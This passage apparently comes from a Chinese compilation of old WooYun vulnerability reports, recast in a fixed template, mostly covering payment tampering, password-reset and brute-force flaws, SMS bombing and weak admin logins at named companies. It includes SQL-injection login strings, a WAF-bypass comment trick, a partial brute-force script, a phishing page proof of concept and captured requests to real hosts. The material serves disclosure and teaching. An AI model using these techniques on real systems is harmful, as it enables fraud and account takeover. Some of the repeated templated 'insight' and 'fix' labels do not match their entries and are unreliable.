**POC**: 可以设置成任意的。。网络电话应该都用过吧。。原理是，打电话的时候给服务器提交自己设置的接听号码，和想拨打的号码，然后你就可以挂电话了。。服务器会给你设置的接听号码和提交拨打的号码同时打电话，然后你们两就互通了，就两方不扣话费了。。目前只测试省钱通这个网络电话，其他的还没测试，没时间呀，其他的网络电话应该都存在此类漏洞。。

**绕过**: 直接利用

**修复**: 对本地号码进行认证。
---

---
### [wooyun-2013-026699] 酒美网订单存在支付漏洞，可修改支付价格并下单
**厂商**: 酒美网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题站点：m.winenice.com1.我们找到一瓶比较贵的酒，嗯，这个不错，899；2.点击加入购物车并抓包，发现是个GET请求，且在url中包含了商品的价格price；https://example.com/[已脱敏]

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2015-0143944] 保险安全之中国人寿某省逻辑漏洞可登陆绑定员工已成功登陆（撞库风险）
**厂商**: 中国人寿 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司端 中国人寿山东点击国寿连接-员工/营销员绑定然后到达登陆页面 需要我们输入8位或者14位的员工号我就用13200000进行测试 然后点击获取验证码点击登陆 然后抓包POST /weixin/empbind/save HTTP/1.1Host: sdapp.e-chinalife.comAccept-Language: zh-cnUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143 MicroMessenger/6.2.4 NetType/WIFI Language/zh_CNAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/

**POC**: 分分钟成功

**绕过**: 直接利用

**修复**: 完善逻辑
---

---
### [wooyun-2012-09160] Windows主分区文件操作bug
**厂商**: 微软 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 测试环境为win7_x64,在主机上挂载主分区包含win7_x32系统的硬盘，在挂载磁盘的“Documents and Settings”目录下新建、修改、删除一个文本文档，C:\Documents and Settings目录下的文件将被进行同样操作。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0167219] 中国邮政速递物流EMS设计逻辑缺陷漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: EMS用户登录处，由于验证码逻辑存在问题，可导致暴力破解注册用户账户信息，可以查看破解账户的手机，地址等敏感信息，也可以网上下单用户登录后台http://**.**.**.**/ec-web/toGoLogin.action找回密码地址http://**.**.**.**/ec-web/findPassword/findPasswordOne.action在找回密码地方，由于没有验证码机制，可以暴力猜测注册用户账号。用了一个小字典测试，发现了以下几个账户 test，某IM软件q，test2，qwe321，test1。得到账户之后，在用户登录地方进行无视验证码暴力破解。

**POC**: email亮了。。。

**绕过**: 直接利用

**修复**: 服务器本身有waf了，可以修复一下验证码逻辑，以及找回密码地方需要防止爆破猜测验证。
---

---
### [wooyun-2015-0154516] APP巡诊系列之：小达APP某功能设计逻辑缺陷
**厂商**: 小达 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: APP名称：小达APP地址：https://example.com/[已脱敏]

**POC**: 1，随便填写一个手机号注册2，忘记密码同理，调用的是同一个接口

**绕过**: 直接利用

**修复**: 屏蔽验证码返回。
---

---
### [wooyun-2012-014661] 求医网逻辑漏洞，导致资料用户信息泄漏甚至变相套现
**厂商**: 求医网 | **年份**: 2012 | **类型**: 用户资料大量泄漏

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 用户资料大量泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户资料大量泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.求医网，是国内较大的医疗门户站点，网址https://example.com/[已脱敏]

**POC**: 1.https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1.修复密码取回环节，修改为随机的密码。2.积分兑换，密码修改验证手机等。
---

---
### [wooyun-2014-066593] 北京自然博物馆后台弱口令或致信息泄露风险
**厂商**: 北京自然博物馆 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我不详细说了，直接上图说明。http://[IP已脱敏]

**POC**: 我不详细说了，直接上图说明。http://[IP已脱敏]

**绕过**: 直接利用

**修复**: 1、管理员设置强密码2、游客身份证信息不能明文显示3、修复业务逻辑
---

---
### [wooyun-2012-011349] 我也来个支付漏洞，0.01元报名考试
**厂商**: 北京考试学院&易宝支付 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: xx>> 网上支付xx>>选银行xx>>开始缴费xx>>修改xx>>你懂得

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2015-0138335] 中企动力商城支付漏洞（影响14+家分站商城）
**厂商**: 中企动力科技股份有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.随便site一下找到14家分站商城，都是一样的漏洞tai300.make-15088.300.cnsissiok.make-15088.300.cn9koudai.make-15088.300.cnmhllshop.make-150100.300.cn210chelejia.make-15088.300.cnhhe.make-15088.300.cnjascaffechina.make-15088.300.cn312lzjjsc.make-15088.300.cnyihaiji.make-15088.300.cnbsy777.make-15088.300.cnchinajzqc.make-15096.300.cnpjlpsc.make-15088.300.cnzt2014041401.make-53.300.cncnnbtc.make-15088.300.cn2.随便选两家http:/

**POC**: 1.随便site一下找到14家分站商城，都是一样的漏洞tai300.make-15088.300.cnsissiok.make-15088.300.cn9koudai.make-15088.300.cnmhllshop.make-150100.300.cn210chelejia.make-15088.300.cnhhe.make-15088.300.cnjascaffechina.make-15088.300.cn312lzjjsc.make-15088.300.cnyihaiji.make-15088.300.cnbsy777.make-15088.300.cnchinajzqc.make-

**绕过**: 直接利用

**修复**: 影响14+家分站商城
---

---
### [wooyun-2015-0151988] 佑一良品某功能存在设计逻辑缺陷
**厂商**: 佑一良品 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台抓包，将积分修改为负数。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0119851] 安邦保险集团存在逻辑漏洞可遍历用户ID暴力破解用户原始密码进而重置用户密码(附脚本)
**厂商**: 安邦保险集团 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用burpsuite进行抓包后发现，userID为纯数字，oldPwd可暴力破解。如图：用户名为邮箱，虽然无法根据userid得到确切的用户名，但可以重置所有用户的密码。写一个python暴力破解的poc，如下：#!/usr/bin/python#coding: utf-8import sysimport urllibimport urllib2def get_headers(dt):headers = {'Accept': '*/*','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36','Connection': 'k

**POC**: 为了不修改其他用户的数据，我只用自己的2个用户进行了测试。密码均修改为123456。

**绕过**: 直接利用

**修复**: 1.userId变为用户不可控2.对密码修改时进行逻辑判断
---

---
### [wooyun-2012-07643] 乌云平台逻辑缺陷导致某些信息泄漏
**厂商**: 乌云官方 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞信息详情会提前泄漏一部分给公众，而且有些信息是相当严重的漏洞细节信息。会危害未公开漏洞的网站的安全。风险比较高。希望乌云尽快修复。

**POC**: https://example.com/[已脱敏] 这个feed泄漏了部分暂未公开的详细信息。<rss version="2.0"><channel><title>wooyun.org 最新热点漏洞</title><link>https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-038772] 某运营商主站某处验证绕过可进行短信轰炸
**厂商**: 某运营商 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] to repeater~前端限制是180秒内只能发一条验证码到同一个手机号，用burp直接post，可以几秒钟之内给同一个号码发10条。(超过10条就不行了上手机截图

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 后端也要限制啊，不能仅仅前端限制，虽然危害不是很大只是几秒钟发10条但还是修修吧。
---

---
### [wooyun-2015-0153893] 联动天下修改域名购买期限价格不变（支付漏洞）
**厂商**: 72e.net | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 联动天下修改域名购买期限价格不变（支付漏洞）第一步：我们拿这个top的域名测试第二步：抓包修改域名的期限第三步：已经修改成功提交订单看看 可不可以OK 可以 但是没钱买 而且我要这个域名也是多余 嘿嘿

**POC**: 同上

**绕过**: 直接利用

**修复**: 修复逻辑问题
---

---
### [wooyun-2015-0155205] DNS劫持可绕过全民枪战反外挂策略文件
**厂商**: 北京卓越晨星科技有限公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网上有很多全民枪战盒子外挂，他们的包名被游戏公司手动录入到这个文件中。android_hackers文件即为反外挂策略文件

**POC**: 现绕过方法有四1、手机HOSTS2、用电脑当热点，在电脑上做WPE、wireshark、fiddler封包替换3、电脑端做DNS劫持4、路由器上做DNS劫持安装盒子依然可以进入游戏  （原版加载时提示：检测到作弊工具）装有多个作弊工具。依然能进入游戏

**绕过**: 直接利用

**修复**: 外挂策略请加密，或者使用其他反外挂方式。
---

---
### [wooyun-2015-091233] 沱沱工社支付逻辑漏洞
**厂商**: tootoo.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 其他的我没测。。。你们自己看看吧提交订单，选择立即支付，抓包开始了修改参数之后一定，修改参数之后浏览器会停在一个界面先别点东西先把代理关了再继续点击高级然后点击继续访问OK了，1元买了两栏草莓嘎嘎。。。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 洗衣服了，你们自己再次测测吧！有问题也可以联系我
---

---
### [wooyun-2015-096239] 某家电厂商短信平台万能密码进后台(各种敏感信息泄露可做短信轰炸机)
**厂商**: 某家电厂商 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址http://[IP已脱敏] or '1'='1admin' or '1'='1成功进入可以自己添加单个号码（可做短信轰炸机哦）危害更大的在下面点击导出历史记录，会下载一个表格然后改成html后缀方便看，不看不知道，一看吓一跳，各种敏感信息泄露，什么招标啊，等等，就随意贴几张图可见系统一直在使用各种信息

**POC**: 漏洞地址http://[IP已脱敏] or '1'='1admin' or '1'='1成功进入可以自己添加单个号码（可做短信轰炸机哦）危害更大的在下面点击导出历史记录，会下载一个表格然后改成html后缀方便看，不看不知道，一看吓一跳，各种敏感信息泄露，什么招标啊，等等，就随意贴几张图可见系统一直在使用各种信息

**绕过**: 直接利用

**修复**: 过滤吧
---

---
### [wooyun-2011-01940] 某电商平台货到付款骗局
**厂商**: 某电商平台网 | **年份**: 2011 | **类型**: 钓鱼欺诈信息

**元思考**: 触发信号: 功能测试

**洞察**: 钓鱼欺诈信息防护不足，开发者信任前端输入

**测试流程**:
1. 识别钓鱼欺诈信息相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 诈骗流程：1.吸引买家骗子卖家首先利用低价吸引买家。2.货到付款买家拍下商品后，骗子联系买家编造种种理由要求买家选择货到付款模式。3.下线货到付款，线上不发货绕过某电商平台信用评价机制卖家通过货到付款，使用仿造的假货通过快递货到付款业务收到买家的钱。而某电商平台网上订单一直保持在“等待卖家发货”状态。而“等待卖家发货”状态下，用户是不能评价，也不能维权的。这样就形成了实际利用某电商平台完成了交易，但网上状态是未完成交易，买家无法评价和维权，也就完美的绕过了某电商平台的信用评价机制。这种状态下唯一的维权方式是消费者热线：0571-85026880，但某电商平台消费者热线非工作时间禁止呼叫，工作时间永远占线。所谓细节决定成败。整个诈骗流程中，骗子利用了很多细节：1. 卖家好评100%利用买家认为好评100%的新卖家最害怕差评的心理，赢取信任。2. 签署某电商平台《消费者保障服务协议》，并交保证金卖家加入某电商平台的店铺保障服务，提供”

**POC**: 骗子似乎已经疯了~~~

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2013-037058] 某厂商积分商城逻辑锉刀导致支付漏洞
**厂商**: 某电脑厂商 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：https://example.com/[已脱敏]

**POC**: 见详细说明。

**绕过**: 直接利用

**修复**: 0x1：校验金额，最好是只传递一个物品id参数后台校验，不要传递价格等参数。0x2：我的礼物再不给我要自己兑换了哟。。。
---

---
### [wooyun-2014-073305] 某安全厂商远程任意文件中写入或清空漏洞
**厂商**: 某安全厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某安全厂商SangforServiceClient.exe进程存在漏洞，通过远程发送数据包，可以向指定机器的任意文件中写入文本文件或清空大于0x800任意文件

**POC**: 通过如图的poc向c盘根目录下写入一个文件执行poc后的效果如下相关代码如下：LRESULT __stdcall sub_40EB10(HWND hWnd, UINT Msg, WPARAM s, LPARAM lParam)中接收数据，然后调用sub_405520((int)&v10, (int)buf)，该函数完成记录Log的功能但是由于并未验证文件名，因此存在此漏洞

**绕过**: 直接利用

**修复**: 写入固定文件
---

---
### [wooyun-2012-014456] Iphone 某互联网公司手势密码绕过登陆
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 创建完手势密码之后返回桌面再进入某互联网公司即被锁定,此时输入五次错误的手势将会提示需要输入某互联网公司密码来安全登陆，这时按HOME返回桌面再次进入某互联网公司会发现又可以输手势密码并且左上角多出一个设置按钮点进去之后就绕过了手势密码进去了，然而手势密码的数据也就被清除了！

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 你懂的
---

---
### [wooyun-2011-02785] 友宝售货机注册漏洞
**厂商**: 友宝在线 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 友宝自动售货机，手机注册可以送两张可乐券，用于购买可乐。1、服务端对用户提交的手机号没有严格的认证，即使是虚假的手机号；2、用户通过发送手机号注册请求后，服务端会往该手机号上面发送一个4位验证码；3、服务端对这个验证码验证次数没有限制，并且服务端对这个验证码保存的时间足够用户暴力破解验证码进行注册4、通过注册送的可乐券购买可乐5、无限注册就能够无限免费购买可乐

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、服务端严格验证手机号正确性；2、服务端设置手机验证码有效期限短一些3、服务端设置手机验证码验证次数，避免恶意注册
---

---
### [wooyun-2016-0166908] 恒昌费用控制系统设计逻辑缺陷已进后台
**厂商**: 恒昌 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 弱口令  URL：http://**.**.**.**:8088/hecprod/账户：admin密码：****1234登录界面：让我静静的思考1分钟：boom!结果：关系到人家重要系统，请恕我不能直接把密码贴出来，请转告相关厂家，谢谢~~~

**POC**: 弱口令  URL：http://**.**.**.**:8088/hecprod/账户：admin密码：****1234登录界面：让我静静的思考1分钟：boom!结果：关系到人家重要系统，请恕我不能直接把密码贴出来，请转告相关厂家，谢谢~~~

**绕过**: 直接利用

**修复**: 改改密码
---

---
### [wooyun-2013-027808] 遨游浏览器4.1.0.300钓鱼欺诈漏洞
**厂商**: 傲游 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浏览器执行逻辑，猜的1=》 打开页面之后，window.location.href变化，或者window.location.replace改变了window.location2=》浏览器检测到window.location变化的事件，修改地址栏为新的window.location3=》发送请求到新的window.location，但是window.location太长，导致dll MxResMgr.dll函数失去响应，但是主程序依旧显示出了网页内容 （2，3造成了内容欺骗）4=》此时发出改变window.location的请求发生阻塞，如果window.location不变化，60秒后没有监听到服务器返回的代码，另外一个函数就会显示“页面请求超时”5=》大约120秒后浏览器崩溃，拒绝服务

**POC**: 打开以下页面，伪造成功执行?<html><head><h1>请在此输入你的帐号和密码</h1><form action="https://example.com/[已脱敏]" method="post">username:<input type="text" id="u"><br/>pw:<input type="text" id="p"><input type="submit" id="s"></form><script type="text/javascript">function mul(str,count){if(count==0) return '';var binaryCount = c

**绕过**: 直接利用

**修复**: 丢弃过长的请求，或者把步骤（2）放在页面加载完成之后再执行
---

---
### [wooyun-2010-0746] IE存在一处文件劫持
**厂商**: Microsoft | **年份**: 2010 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: IE在加载本地XML时会优先加载当前工作路径下wdmaud.drv文件（下一个是Desktop），导致类似DLL Hijacking攻击。

**POC**: 请自行测试

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2012-015148] 找了几个风行的小问题
**厂商**: 北京风行在线技术有限公司 | **年份**: 2012 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.后台登陆提示，可导致暴力破解账号可以猜解，后台存在哪些用户，在爆破，而且，很多网扎后台，错误提示都是这样的2.敏感信息泄露路径泄露登录目录泄露网站配置可下载

**POC**: 1.后台登陆提示，可导致暴力破解账号可以猜解，后台存在哪些用户，在爆破，而且，很多网扎后台，错误提示都是这样的2.敏感信息泄露路径泄露登录目录泄露网站配置可下载

**绕过**: 直接利用

**修复**: 多多注意这些小问题
---

---
### [wooyun-2014-053173] 【安卓】两招让暴风影音私人珍藏密码形同虚设
**厂商**: 暴风影音 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一个方法重置密码，会被发现。第二个方法是第一个的升级版，需要传走文件，但不会重置目标的密码。简要说明，1.接触目标手机，2.清除密码(跳转到4)或传走加密文件，3.在自己手机清除密码，4.欣赏视频。

**POC**: 第一招本人比较健忘也爱设奇葩的密码，，暴风影音私人收藏密码忘了自己都猜不出来 。。求助客服无果后，只好自己探索。第二招然后告诉了客服希望有找回密码和补上这个缺陷，，过了很久以后还是这样，，于是有了机会继续探索这个缺陷。话说，加密视频这么大的玩意不存手机里存哪去？于是开始翻找文件夹，果然找到了，隐蔽文件夹.baofengtemp赶紧把文件传到朋友手机相同目录去(本人安卓2.3，盆友4.3，屌丝伤不起。)再让朋友打开私人收藏，，看来暴风影音已经料到了这招。既然之前一招能奏效，那么这里能否套用一下？果然成功了。送上我测试的文件，顺便说下这视频挺有趣的，，https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1，给个找回密码功能，最好是通过网络等不能在本地清除的方式，针对方法一。2，加密方式上要改进，防范方法二。3，如果大部分用户宁愿销毁视频也不想被偷看，则密码和加密文件要有相关性(忘记密码就再也不能看此密码加密的视频)4.1求礼物，，如果不方便跳转到4.2。4.2求10rank，这样我就可以升级白帽子
---

---
### [wooyun-2015-094155] 盛大旗下某商城存在支付漏洞可0元购物
**厂商**: 盛大网络 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 抱着被忽略的心态来提交   ~~~~(>_<)~~~~  大部分的支付漏洞都被忽略了

**POC**: 首先我们去盛大旗下的果壳电子选购一件商品https://example.com/[已脱敏] -1然后填写收获地址之后提交，继续截断再把money这个参数改成一个正数 如1订单提交成功，某电商平台等于0，无法支付，没关系，有货到付款OK  订单完成

**绕过**: 直接利用

**修复**: 验证参数……我真是抱着被忽略的心态来提交
---

---
### [wooyun-2015-098507] 宜信旗下某子站逻辑漏洞可导致任意金额支付
**厂商**: 宜信 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 宜信旗下的宜信保险子站，网址https://example.com/[已脱敏] type="text" data-x-vfmt="^\d+$" placeholder="此项自动计算" title="此项自动计算" name="i149b3e6ab66" id="i149b3e6ab66" readonly="">使用firebug或其他调试工具，去掉readonly属性，修改为你想要的任意金额，比如1元，点击下一步4：支付时已经变成你想要的价格了！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 支付时应从服务器拉取数据，而不是直接读客户端的值！！
---

---
### [wooyun-2015-090799] 某搜索引擎云加速防御规则绕过
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试https://example.com/[已脱敏] 可被拦截测试https://example.com/[已脱敏]

**POC**: 用/*!50000SeLect*/代替select可成功绕过https://example.com/[已脱敏] 不被拦截

**绕过**: 直接利用

**修复**: /*!50000SeLect*/规则
---

---
### [wooyun-2016-0182273] 通联宝APP设计逻辑缺陷可重置任意手机号密码
**厂商**: allinpay.com | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网www.tonghuafund.com/ＡＰＰ下载https://example.com/[已脱敏] 测试账号：个人用户15559379841 （账户名跟手机号是一样的发送验证查看数据包验证码直接返回输入验证码，跳转至设置密码页面，输入新密码即可登录

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 取消回显
---

---
### [wooyun-2015-0129018] 2345好压全版本漏洞可通过中间人攻击向目标机器植入木马（需中间人前提）
**厂商**: 2345网址导航 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 好压默认设置为自动升级，每次打开好压，或者解压缩软件的时候，总是不胜其烦的弹出升级。抓取下数据包发现，好压每次升级请求：POST https://example.com/[已脱敏] HTTP/1.1Content-Type: application/x-www-form-urlencodedHost: update.haozip.2345.comContent-Length: 213Pragma: no-cacheupdater_version=10340&updater_lang=chs&lang=chs&updater_type=haozip&main_ver=5.3&silent_updater_version=10340&silent_main_ver=5.3&os_ver=6.3&csd_ver=&special_ver=000000&action_type=check

**POC**: 不出意料，2345已经检测到“5.4”这个升级了。然后我的“病毒”就被下载：然后开始运行。。。

**绕过**: 直接利用

**修复**: 对服务器返回的数据进行加密，校验下载文件的数字签名
---

---
### [wooyun-2016-0172514] 融某安全厂商某站点Mysql注射漏洞
**厂商**: 融360 | **年份**: 2016 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: RT下了一个融360APP准备研究逻辑漏洞的，结果测试时发现了注入。。。

**POC**: 手机抓包得到POST /zhigou/mapi/appv10/auth HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 653Host: bigapp.rong360.comConnection: Keep-AliveAccept-Encoding: gzipCookie: __utmz=1453638415.utmcsr=(direct)|utmcmd=(direct); RONGID=f21fc42fceb01a1542fedc818091b45d; abclass=1453638415_4Use

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-032623] 爱名网任意会员账号密码修改（又能劫持域名）
**厂商**: 爱名网 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册个爱名网账号 https://example.com/[已脱敏] 邮箱会注册帐号时填写的邮箱会收到一封密码找回邮件访问邮件中的密码修改地址 进入一个密码修改的页面试着直接修改链接里的uid 也就是用户id  失败！好吧 上神器chrome

**POC**: 然后修改密码吧

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0108093] 某网店系统存在支付漏洞
**厂商**: www.lebi.cn | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、购买物品是数量可以是负数 选择一件购物数量为负数2、因为负数不能付款,所以我们可以买2件一件负数一件整数正好把负数的钱给减去3、下面直接来某电商平台接口付款了ok

